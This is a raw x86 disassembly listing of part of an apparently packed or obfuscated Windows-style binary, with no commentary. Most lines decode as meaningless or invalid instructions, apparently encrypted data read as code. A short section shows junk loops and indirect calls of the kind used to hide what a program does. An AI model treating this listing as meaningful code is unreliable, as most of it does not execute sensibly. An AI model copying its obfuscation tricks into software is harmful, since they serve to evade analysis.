  406a0a:	mov    ds:0xa8f7aa5a,al
  406a0f:	ficomp DWORD PTR [ebp+0x1e]
  406a12:	test   eax,0x30fa5739
  406a17:	dec    ebx
  406a18:	mov    bh,0x59
  406a1a:	xor    eax,0x59ae7cff
  406a1f:	dec    ebp
  406a20:	dec    ebp
  406a21:	cmc    
  406a22:	inc    ecx
  406a23:	adc    ecx,DWORD PTR es:[ecx-0x12]
  406a27:	xchg   BYTE PTR [edi+0x9a4a487],bl
  406a2d:	ds xor eax,0x6598327c
  406a33:	add    cl,cl
  406a35:	popa   
  406a36:	fbstp  TBYTE PTR [ecx+0x5e]
  406a39:	jns    0x406a6b
  406a3b:	mov    esp,edi
  406a3d:	mov    al,0x98
  406a3f:	inc    esi
  406a40:	inc    esp
  406a41:	dec    edx
  406a42:	cmp    eax,0xe251fca2
  406a47:	cmp    DWORD PTR [ebp-0x6742716b],ebp
  406a4d:	mov    esi,0x173f2c71
  406a52:	imul   esp,DWORD PTR [ecx+0x3c642b27]
  406a59:	fxch   st(2)
  406a5b:	jge    0x406a65
  406a5d:	popa   
  406a5e:	into   
  406a5f:	sub    bh,BYTE PTR [edi]
  406a61:	dec    esi
  406a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a63:	lods   eax,DWORD PTR ds:[esi]
  406a64:	xchg   esp,eax
  406a65:	pop    es
  406a66:	or     DWORD PTR [edx-0x1b4cd8d7],edx
  406a6c:	fwait
  406a6d:	daa    
  406a6e:	ret    
  406a6f:	xor    DWORD PTR [ebx+0x2620214f],ebp
  406a75:	mov    ebx,0x4c0f9708
  406a7a:	in     eax,0xd2
  406a7c:	adc    DWORD PTR [edx],ecx
  406a7e:	mov    ecx,0x7ed75f71
  406a83:	mov    dl,0x70
  406a85:	xchg   BYTE PTR [ebx-0x62],bl
  406a88:	icebp  
  406a89:	into   
  406a8a:	lahf   
  406a8b:	out    0xa7,eax
  406a8d:	xor    edx,ecx
  406a8f:	adc    al,0x82
  406a91:	fs xchg edx,eax
  406a93:	das    
  406a94:	mov    ds:0x8854d974,eax
  406a99:	rcr    cl,1
  406a9b:	mov    bh,0xdc
  406a9d:	dec    ecx
  406a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a9f:	dec    esp
  406aa0:	idiv   dh
  406aa2:	test   DWORD PTR [edi+0x5a],ebp
  406aa5:	popf   
  406aa6:	cdq    
  406aa7:	sbb    BYTE PTR [esi+0x12],0x79
  406aab:	cdq    
  406aac:	retf   
  406aad:	and    eax,0xc0103231
  406ab2:	jle    0x406ab6
  406ab4:	(bad)  
  406ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ab6:	nop
  406ab7:	scas   al,BYTE PTR es:[edi]
  406ab8:	dec    esi
  406ab9:	lea    esp,[ebp+0x48]
  406abc:	ret    
  406abd:	into   
  406abe:	or     eax,0x9fe09c59
  406ac3:	ins    BYTE PTR es:[edi],dx
  406ac4:	(bad)  
  406ac6:	out    dx,eax
  406ac7:	and    cl,BYTE PTR [ecx]
  406ac9:	jecxz  0x406a65
  406acb:	sar    DWORD PTR [esi+0x42],cl
  406ace:	and    BYTE PTR [ebx-0x24b78fe2],bl
  406ad4:	mov    ds:0x4c8d2976,eax
  406ad9:	loop   0x406b2e
  406adb:	mov    eax,ds:0x67b579c5
  406ae0:	popf   
  406ae1:	xor    ch,BYTE PTR [ecx]
  406ae3:	outs   dx,DWORD PTR ds:[esi]
  406ae4:	cmp    eax,DWORD PTR [ecx]
  406ae6:	loop   0x406b28
  406ae8:	dec    esp
  406ae9:	jo     0x406b2b
  406aeb:	(bad)  
  406aec:	repz xor al,0x1d
  406aef:	imul   ebx,DWORD PTR [edi],0x43
  406af2:	mov    ds:0xa0870320,al
  406af7:	pop    esi
  406af8:	mov    eax,0x824dd59f
  406afd:	pop    ss
  406afe:	fwait
  406aff:	jl     0x406b56
  406b01:	inc    esi
  406b02:	fs loopne 0x406a9d
  406b05:	pop    eax
  406b06:	dec    ecx
  406b07:	jmp    0x406b50
  406b09:	adc    edx,esi
  406b0b:	mov    ah,0x4d
  406b0d:	lahf   
  406b0e:	enter  0x35a5,0x59
  406b12:	inc    esp
  406b13:	jne    0x406b06
  406b15:	pop    ebx
  406b16:	xchg   ebx,eax
  406b17:	in     eax,0xcd
  406b19:	popa   
  406b1a:	hlt    
  406b1b:	out    0x8b,eax
  406b1d:	in     eax,0xfa
  406b1f:	jmp    0x406aba
  406b21:	jl     0x406b1d
  406b23:	mov    dl,0x7
  406b25:	arpl   WORD PTR [esi],di
  406b27:	repnz iret 
  406b29:	jmp    0x640024cd
  406b2e:	imul   esp,DWORD PTR [ebp+0x20],0xcd63e1d3
  406b35:	lods   eax,DWORD PTR ds:[esi]
  406b36:	or     bh,al
  406b38:	jmp    0x3a9a18b9
  406b3d:	shr    DWORD PTR [esi],cl
  406b3f:	push   ds
  406b40:	and    BYTE PTR [eax+0xb438407],ah
  406b46:	dec    esi
  406b47:	into   
  406b48:	push   esp
  406b49:	lahf   
  406b4a:	popf   
  406b4b:	mov    eax,0x11ffc15
  406b50:	inc    ebp
  406b51:	shl    BYTE PTR [edi-0x71],1
  406b54:	fsubrp st(0),st
  406b56:	push   eax
  406b57:	inc    ecx
  406b58:	loop   0x406b88
  406b5a:	retf   0x4bcd
  406b5d:	and    eax,DWORD PTR [edi+0x4af9c097]
  406b63:	mov    ebp,0xc6cd47fa
  406b68:	outs   dx,BYTE PTR ds:[esi]
  406b69:	daa    
  406b6a:	imul   edi,esp,0x9a2974a3
  406b70:	adc    eax,0x6c27102f
  406b75:	pop    edx
  406b76:	and    DWORD PTR [ebp+ebx*1-0x2c],ebp
  406b7a:	lahf   
  406b7b:	sub    cl,ah
  406b7d:	push   es
  406b7e:	cli    
  406b7f:	shl    BYTE PTR [ecx],0x2d
  406b82:	retf   
  406b83:	mov    eax,0xb9d958d2
  406b88:	or     eax,0x8a0aade5
  406b8d:	inc    edi
  406b8e:	add    DWORD PTR [eax+edi*8],edi
  406b91:	std    
  406b92:	push   ds
  406b93:	cmp    eax,0x2b5db8ad
  406b98:	shr    DWORD PTR [eax-0x5e],0xf8
  406b9c:	sbb    DWORD PTR [edi],esi
  406b9e:	rcl    al,1
  406ba0:	push   cs
  406ba1:	mov    esi,0xaa65eaa0
  406ba6:	imul   BYTE PTR [esi-0x3b]
  406ba9:	loope  0x406b84
  406bab:	inc    ecx
  406bac:	stc    
  406bad:	lods   al,BYTE PTR ds:[esi]
  406bae:	stc    
  406baf:	sub    eax,0xd0800dfe
  406bb4:	(bad)  ds:0xca757373
  406bba:	jmp    0x9697f479
  406bbf:	call   DWORD PTR [esi+0x12]
  406bc2:	(bad)  
  406bc4:	cmp    DWORD PTR [ecx-0x460568e4],0xffffffce
  406bcb:	pmaxsw mm6,QWORD PTR [edi]
  406bce:	adc    eax,0x9ab592a0
  406bd3:	mov    edi,0xabfe9185
  406bd8:	and    dh,ah
  406bda:	pop    es
  406bdb:	mov    eax,ds:0x70a28a3b
  406be0:	xchg   ebx,eax
  406be1:	xor    dl,BYTE PTR [ebx]
  406be3:	aad    0xf0
  406be5:	lods   eax,DWORD PTR ds:[esi]
  406be6:	(bad)  
  406be7:	mov    ds:0x2be39724,eax
  406bec:	shr    ah,1
  406bee:	mov    ecx,ebx
  406bf0:	xchg   edx,eax
  406bf1:	jmp    0x406be8
  406bf3:	in     al,dx
  406bf4:	dec    DWORD PTR [edx+0x69]
  406bf7:	hlt    
  406bf8:	popa   
  406bf9:	imul   edx,DWORD PTR [esp+ebx*4+0x22],0xffffffef
  406bfe:	mov    bh,0xf4
  406c00:	imul   edx,DWORD PTR [edx-0x46],0xb92ec876
  406c07:	jo     0x406c02
  406c09:	push   eax
  406c0a:	jecxz  0x406c47
  406c0c:	mov    ds:0x412224,eax
  406c11:	mov    eax,DWORD PTR [ebp+0xc]
  406c14:	xor    eax,ecx
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	popf   
  406c28:	mov    cl,0xbe
  406c2a:	in     al,dx
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	ficomp WORD PTR [ecx]
  406c35:	sbb    BYTE PTR [esi-0x3c],dl
  406c38:	or     al,ah
  406c3a:	mov    ds:0xb168bd19,eax
  406c3f:	test   BYTE PTR [eax+0x1e5dc6c9],0xb8
  406c46:	xchg   esi,eax
  406c47:	sbb    eax,0xd87d21ff
  406c4c:	shl    DWORD PTR [eax-0x46],0xef
  406c50:	add    al,0x69
  406c52:	pop    eax
  406c53:	aad    0xf0
  406c55:	shl    DWORD PTR [edi-0x1e6c1d48],1
  406c5b:	xchg   esp,eax
  406c5c:	add    eax,0x87e62fc6
  406c61:	sub    edi,DWORD PTR [esi+0x27bf9046]
  406c67:	popf   
  406c68:	pushf  
  406c69:	add    edx,esp
  406c6b:	mov    eax,ds:0xd7f34f3b
  406c70:	cmp    ecx,DWORD PTR [ebp+0x66e74679]
  406c76:	ret    0xa366
  406c79:	pop    edx
  406c7a:	push   eax
  406c7b:	dec    ecx
  406c7c:	int    0xca
  406c7e:	sub    esp,edx
  406c80:	adc    eax,0x8e9c30d7
  406c85:	fistp  WORD PTR [bx+si+0x16]
  406c89:	jle    0x406c95
  406c8b:	fstp   QWORD PTR [esi+eiz*2+0x7be7c592]
  406c92:	test   eax,0xa3ef0132
  406c97:	out    0x15,eax
  406c99:	add    eax,0x98874c43
  406c9e:	xchg   ebp,eax
  406c9f:	adc    al,0x2d
  406ca1:	xor    DWORD PTR [edi-0x62],esp
  406ca4:	fmulp  st(3),st
  406ca6:	pop    ss
  406ca7:	clc    
  406ca8:	clc    
  406ca9:	arpl   WORD PTR ds:[ecx+ecx*4+0x342e841c],bx
  406cb1:	mov    bl,0xce
  406cb3:	call   0x7891d2b
  406cb8:	test   eax,0x514a5281
  406cbd:	pushw  es
  406cbf:	addr16 push eax
  406cc1:	fstp   DWORD PTR [ebx+0xba0406d]
  406cc7:	fidivr DWORD PTR [ebp+0x4e]
  406cca:	mov    dl,0x96
  406ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ccd:	hlt    
  406cce:	adc    DWORD PTR [eax],0xeef3333c
  406cd4:	sbb    BYTE PTR [ecx-0x50a7c328],bl
  406cda:	push   esp
  406cdb:	sbb    ebx,DWORD PTR [eax]
  406cdd:	adc    al,0x87
  406cdf:	push   edi
  406ce0:	arpl   WORD PTR [eax],si
  406ce2:	inc    ebx
  406ce3:	shl    DWORD PTR [eax+0x497a26e5],0x31
  406cea:	jo     0x406cd0
  406cec:	dec    ebp
  406ced:	and    ebp,DWORD PTR es:[edi]
  406cf0:	jecxz  0x406d51
  406cf2:	jno    0x406d6a
  406cf4:	mov    ch,0xd4
  406cf6:	std    
  406cf7:	mov    esi,0x9c7541ac
  406cfc:	(bad)  
  406cfd:	sub    al,0x4e
  406cff:	scas   eax,DWORD PTR es:[edi]
  406d00:	fwait
  406d01:	leave  
  406d02:	xchg   esi,eax
  406d03:	and    bh,BYTE PTR [ebp+0x6c4f935d]
  406d09:	xor    esp,DWORD PTR cs:[ebp+esi*2-0x4c]
  406d0e:	push   0x1b928607
  406d13:	pop    es
  406d14:	pusha  
  406d15:	das    
  406d16:	aad    0x77
  406d18:	out    dx,eax
  406d19:	pop    ss
  406d1a:	add    eax,0xbeaf0de9
  406d1f:	sti    
  406d20:	bound  eax,QWORD PTR [ebp-0x54]
  406d23:	and    al,0x8b
  406d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d26:	(bad)  
  406d27:	sbb    al,0x6b
  406d29:	xlat   BYTE PTR ds:[ebx]
  406d2a:	in     al,0x35
  406d2c:	out    0xa,eax
  406d2e:	push   DWORD PTR [esi]
  406d30:	sub    DWORD PTR [ecx-0x6c],0x4cca96d7
  406d37:	test   eax,0x195cc54f
  406d3c:	dec    edx
  406d3d:	add    dh,dh
  406d3f:	aam    0xf7
  406d41:	pop    sp
  406d43:	cs mov edx,0x709af312
  406d49:	xchg   ebx,eax
  406d4a:	jne    0x406d51
  406d4c:	aaa    
  406d4d:	xor    esi,DWORD PTR [ebp+0x4bb80beb]
  406d53:	sbb    al,0x4c
  406d55:	ss mov ebx,0xa34aa320
  406d5b:	and    DWORD PTR [bp+si-0x29f],edi
  406d60:	rol    DWORD PTR ds:0xe75f1045,0x57
  406d67:	and    ebx,DWORD PTR [esi]
  406d69:	imul   ebp,DWORD PTR [ebx-0x230365ba],0x8adba2d2
  406d73:	(bad)  
  406d74:	dec    ecx
  406d75:	into   
  406d76:	cdq    
  406d77:	pop    ebx
  406d78:	mov    ch,0xd8
  406d7a:	cmp    ah,BYTE PTR [eax]
  406d7c:	test   BYTE PTR ds:0x99d40383,0xe9
  406d83:	loope  0x406d97
  406d85:	nop
  406d86:	(bad)  
  406d87:	and    edx,DWORD PTR [edi]
  406d89:	cli    
  406d8a:	int    0x59
  406d8c:	xchg   esp,eax
  406d8d:	jecxz  0x406db1
  406d8f:	loop   0x406d40
  406d91:	sar    DWORD PTR [esi+0x2180a568],0x83
  406d98:	mov    edx,0x8ef8e4a2
  406d9d:	gs (bad) 
  406da0:	dec    edx
  406da1:	xchg   esp,eax
  406da2:	arpl   ax,ax
  406da4:	mov    ch,BYTE PTR [edi-0x11]
  406da7:	pop    edi
  406da8:	call   0xe8a4:0xedbde5b3
  406daf:	jb     0x406d82
  406db1:	pop    ebx
  406db2:	(bad)
  406db6:	cmp    esi,DWORD PTR [ebx]
  406db8:	push   0xffffff9e
  406dba:	xchg   edx,eax
  406dbb:	je     0x406dd5
  406dbd:	jae    0x406d9a
  406dbf:	jl     0x406d7d
  406dc1:	adc    DWORD PTR [ecx],esi
  406dc3:	in     al,0xd9
  406dc5:	int3   
  406dc6:	sub    eax,0x1dcdaf59
  406dcb:	(bad)  
  406dcc:	retf   0xa770
  406dcf:	int    0xbb
  406dd1:	fld    QWORD PTR [edx+0x33b5f63c]
  406dd7:	stos   DWORD PTR es:[edi],eax
  406dd8:	and    eax,0xffffff85
  406ddb:	clc    
  406ddc:	cmp    eax,0x6b998820
  406de1:	xchg   ebp,eax
  406de2:	dec    ecx
  406de3:	adc    eax,0xb9f15481
  406de8:	xor    BYTE PTR [edx+esi*4],0x7d
  406dec:	adc    eax,DWORD PTR [edi+0x23471d0]
  406df2:	pop    esi
  406df3:	cdq    
  406df4:	shl    BYTE PTR [eax+eax*8],cl
  406df7:	xchg   BYTE PTR [edi-0x3283c660],bh
  406dfd:	xchg   esp,eax
  406dfe:	xchg   esi,eax
  406dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e00:	push   es
  406e01:	xchg   edx,eax
  406e02:	push   esi
  406e03:	es jl  0x406e18
  406e06:	ret    
  406e07:	out    0x53,eax
  406e09:	aam    0x54
  406e0b:	sub    bh,bl
  406e0d:	jne    0x406daf
  406e0f:	inc    eax
  406e10:	ror    BYTE PTR [edx+edi*1-0x5e1722ff],1
  406e17:	xor    DWORD PTR ds:0xc206a42c,esp
  406e1d:	inc    ecx
  406e1e:	push   ds
  406e1f:	cmp    cl,BYTE PTR ds:0x2908650c
  406e25:	bound  ebx,QWORD PTR [edx-0x3e4f6af8]
  406e2b:	push   0xb925c1a4
  406e30:	(bad)  
  406e31:	jmp    0x406e43
  406e33:	sar    BYTE PTR [ecx-0x772e9407],1
  406e39:	ds jmp 0x1570:0xac3aecb3
  406e41:	(bad)  
  406e42:	in     eax,dx
  406e43:	(bad)  
  406e44:	push   ebx
  406e45:	adc    bh,al
  406e47:	mov    DWORD PTR [edi-0x45],0xc4cad74f
  406e4e:	xchg   ebx,eax
  406e4f:	dec    esp
  406e50:	lahf   
  406e51:	cdq    
  406e52:	mov    BYTE PTR ds:0xed8a2865,ch
  406e58:	pop    esp
  406e59:	pop    es
  406e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e5b:	dec    edx
  406e5c:	push   0x9e5112f
  406e61:	fst    QWORD PTR [ecx]
  406e63:	sahf   
  406e64:	push   esi
  406e65:	hlt    
  406e66:	adc    al,cl
  406e68:	cs adc edi,ecx
  406e6b:	mov    eax,0x13a4db14
  406e70:	add    eax,0x5772e6bc
  406e75:	push   eax
  406e76:	fmul   QWORD PTR [ebp+0x7a]
  406e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e7a:	popa   
  406e7b:	mov    al,0x54
  406e7d:	add    BYTE PTR [ebx],bl
  406e7f:	call   0xd81c6d0d
  406e84:	sub    al,0x1d
  406e86:	sub    eax,0x41394150
  406e8b:	lock xchg BYTE PTR [ebx],bl
  406e8e:	test   al,0x9e
  406e90:	push   es
  406e91:	sbb    DWORD PTR [edi+0x1e5c537a],edi
  406e97:	jbe    0x406efa
  406e99:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  406e9b:	popf   
  406e9c:	or     al,0xfa
  406e9e:	sbb    eax,0xf8d0f074
  406ea3:	sti    
  406ea4:	inc    ecx
  406ea5:	add    DWORD PTR [ecx+0x2fece9e8],0x5c064d0c
  406eaf:	push   0xfaf8206b
  406eb4:	jmp    0x1d66c57f
  406eb9:	sub    al,cl
  406ebb:	push   es
  406ebc:	clc    
  406ebd:	in     al,0xf3
  406ebf:	push   es
  406ec0:	pop    es
  406ec1:	mov    edx,0xbea91e25
  406ec6:	jne    0x406e96
  406ec8:	xor    eax,0x8f5f8106
  406ecd:	popf   
  406ece:	adc    BYTE PTR [ebx],bh
  406ed0:	out    0xad,al
  406ed2:	jp     0x406f18
  406ed4:	pop    eax
  406ed5:	shr    BYTE PTR [edx-0x63d33b52],cl
  406edb:	adc    eax,0x79b8ee0f
  406ee0:	cld    
  406ee1:	adc    eax,0x207157b3
  406ee6:	xlat   BYTE PTR ds:[ebx]
  406ee7:	xchg   edi,esp
  406ee9:	jb     0x406f53
  406eeb:	neg    bh
  406eed:	int    0xe
  406eef:	popa   
  406ef0:	stos   BYTE PTR es:[edi],al
  406ef1:	jle    0x406ec0
  406ef3:	pop    esp
  406ef4:	mov    WORD PTR [edi+0x2],cs
  406ef7:	loopne 0x406eea
  406ef9:	adc    BYTE PTR [edx],bl
  406efb:	push   es
  406efc:	xor    al,0x8
  406efe:	cmp    DWORD PTR [ebp-0x5a],edx
  406f01:	pop    eax
  406f02:	fwait
  406f03:	mov    DWORD PTR [ecx],ecx
  406f05:	adc    ebx,DWORD PTR [edx+0x2dc8b207]
  406f0b:	enter  0x4ca3,0x28
  406f0f:	adc    dl,dl
  406f11:	sub    esi,edi
  406f13:	out    dx,eax
  406f14:	stc    
  406f15:	test   BYTE PTR [edi*2-0xe7d8c65],dl
  406f1c:	jnp    0x406eff
  406f1e:	fcomi  st,st(0)
  406f20:	adc    eax,0xaa82a947
  406f25:	adc    BYTE PTR [esi-0x45c0c05a],0x61
  406f2c:	sbb    dh,BYTE PTR [esi+0x51]
  406f2f:	fsubrp st(4),st
  406f31:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406f33:	mov    eax,0xc64c05f1
  406f38:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406f3a:	dec    ecx
  406f3b:	pop    esi
  406f3c:	je     0x406ef9
  406f3e:	cmp    edi,ebx
  406f40:	and    eax,0x224d11da
  406f45:	test   eax,0xff156a12
  406f4a:	xor    al,BYTE PTR [esi+0x5b3130f8]
  406f50:	jmp    0x8c54:0x3a9e24ea
  406f57:	stos   DWORD PTR es:[edi],eax
  406f58:	arpl   WORD PTR [esi-0x2b],bp
  406f5b:	xchg   edi,eax
  406f5c:	std    
  406f5d:	bound  esp,QWORD PTR [eax-0x6c]
  406f60:	sub    edx,edi
  406f62:	imul   ebp,DWORD PTR [eax],0x6872bf42
  406f68:	push   es
  406f69:	cmp    bh,BYTE PTR [ebx-0x17]
  406f6c:	ins    DWORD PTR es:[edi],dx
  406f6d:	pop    edi
  406f6e:	out    0xad,eax
  406f70:	jne    0x406f7a
  406f72:	cmp    ebx,DWORD PTR [eax-0x5f]
  406f75:	sbb    ebx,DWORD PTR [esi]
  406f77:	xchg   edx,eax
  406f78:	scas   eax,DWORD PTR es:[edi]
  406f79:	jnp    0x406f8f
  406f7b:	xchg   ebp,eax
  406f7c:	sbb    BYTE PTR [edx+0x6a],al
  406f7f:	mov    edx,0x11be676b
  406f84:	sbb    al,BYTE PTR [esi+0x43]
  406f87:	cmp    ebx,DWORD PTR [ecx-0x53ed9e64]
  406f8d:	jmp    0x1b730dfa
  406f92:	in     al,dx
  406f93:	lds    esi,FWORD PTR [ebx]
  406f95:	xlat   BYTE PTR ds:[ebx]
  406f96:	(bad)  
  406f97:	int    0xa8
  406f99:	shl    esi,1
  406f9b:	loop   0x406f4d
  406f9d:	add    al,0x16
  406f9f:	arpl   WORD PTR [ebx],ax
  406fa1:	ret    0x2ca3
  406fa4:	and    al,BYTE PTR [ecx+0x0]
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430616,0x19
  406fd8:	cmp    DWORD PTR ds:0x430616,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430616,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42ec44
  406ffd:	cmp    DWORD PTR ds:0x430616,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430616
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430616,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430616
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430616,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x4306d6,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x4306ca,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ef98,0x42efa0
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ef90,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ef9c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ef9c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ef9c,ecx
  407083:	cmp    DWORD PTR ds:0x42ef9c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42ed24
  4070a9:	cmp    DWORD PTR ds:0x42ef9c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ef9c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ef9c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ef9c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x4306da,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42efa8,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42efa8
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42efa8,ecx
  4070fe:	cmp    DWORD PTR ds:0x42efa8,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42efa8,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42efa4
  407123:	call   DWORD PTR ds:0x42ed28
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x43063a
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430612,0x17
  407147:	cmp    DWORD PTR ds:0x430612,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430612,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42eb84
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430612
  407179:	dec    eax
  40717a:	mov    ds:0x430612,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xd169d4bb
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407149
  4071b2:	xchg   ebx,eax
  4071b3:	sub    bl,ch
  4071b5:	sub    DWORD PTR [eax-0xd],ecx
  4071b8:	rep outs dx,BYTE PTR ds:[esi]
  4071ba:	sub    al,al
  4071bc:	(bad)  
  4071bd:	inc    BYTE PTR [ebx-0x23415850]
  4071c3:	cmc    
  4071c4:	(bad)  
  4071c5:	xchg   esp,eax
  4071c6:	and    dl,dh
  4071c8:	out    0x43,al
  4071ca:	popf   
  4071cb:	add    DWORD PTR [ebp+0x26],ebx
  4071ce:	xchg   esp,eax
  4071cf:	jno    0x407166
  4071d1:	xchg   BYTE PTR [esi],bl
  4071d3:	jmp    0x40720b
  4071d5:	das    
  4071d6:	ret    
  4071d7:	outs   dx,BYTE PTR ds:[esi]
  4071d8:	and    BYTE PTR [ebx+0x4c],bl
  4071db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071dc:	xchg   ebp,eax
  4071dd:	push   es
  4071de:	aas    
  4071df:	out    0xa2,eax
  4071e1:	add    eax,0x9b704b2a
  4071e6:	out    dx,al
  4071e7:	pop    edx
  4071e8:	jo     0x407170
  4071ea:	push   eax
  4071eb:	pushf  
  4071ec:	(bad)  
  4071ed:	les    ecx,FWORD PTR [edi]
  4071ef:	xor    al,bl
  4071f1:	ins    DWORD PTR es:[edi],dx
  4071f2:	out    0xe3,al
  4071f4:	mov    ch,BYTE PTR [ecx+0xd]
  4071f7:	bswap  esp
  4071f9:	push   ebx
  4071fa:	gs leave 
  4071fc:	push   ss
  4071fd:	js     0x407236
  4071ff:	sti    
  407200:	or     eax,edx
  407202:	cwde   
  407203:	pop    esp
  407204:	hlt    
  407205:	sub    ch,dl
  407207:	mov    esp,0xa3890d0e
  40720c:	lods   eax,DWORD PTR ds:[esi]
  40720d:	add    BYTE PTR [esp+edx*1],0x57
  407211:	xor    BYTE PTR [eax-0x2d6218a2],bl
  407217:	addr16 mov ebx,0xec18a641
  40721d:	repnz mov dh,0x90
  407220:	push   0x986a9077
  407225:	js     0x407294
  407227:	pop    ecx
  407228:	dec    BYTE PTR [ecx+0x2c90cdaf]
  40722e:	sub    ebp,DWORD PTR [ebp-0x30]
  407231:	icebp  
  407232:	stc    
  407233:	iret   
  407234:	pop    ebp
  407235:	ss add eax,0xdd5322e7
  40723b:	mov    ebx,0xdddb15fc
  407240:	or     al,0xe0
  407242:	repz out 0xf0,al
  407245:	xchg   ebx,eax
  407246:	pop    eax
  407247:	xchg   esi,eax
  407248:	inc    esp
  407249:	sub    bh,BYTE PTR [edx+0x9]
  40724c:	inc    esi
  40724d:	in     eax,dx
  40724e:	in     al,0x7b
  407250:	es push 0xffffffa0
  407253:	jle    0x407207
  407255:	or     eax,DWORD PTR [esi-0x3d081d7c]
  40725b:	ja     0x407224
  40725d:	jg     0x40726b
  40725f:	shr    BYTE PTR [ebx-0x1468b64],cl
  407265:	add    bh,BYTE PTR ds:0x7271168b
  40726b:	in     al,dx
  40726c:	pop    ebx
  40726d:	mov    ah,0x5d
  40726f:	push   ss
  407270:	xlat   BYTE PTR ds:[ebx]
  407271:	test   BYTE PTR [ecx-0x6dfe36da],cl
  407277:	cmp    ah,BYTE PTR [eax+eiz*8+0x7a]
  40727b:	enter  0xe058,0xfe
  40727f:	xchg   ebp,eax
  407280:	icebp  
  407281:	fwait
  407282:	data16 cmp bh,bl
  407285:	xor    eax,0x49896b16
  40728a:	pushf  
  40728b:	fnstcw WORD PTR [edx+0x4c2f843c]
  407291:	jne    0x407249
  407293:	jns    0x4072dd
  407295:	add    DWORD PTR [eax+eiz*2],0xa782ee68
  40729c:	inc    ebx
  40729d:	dec    ecx
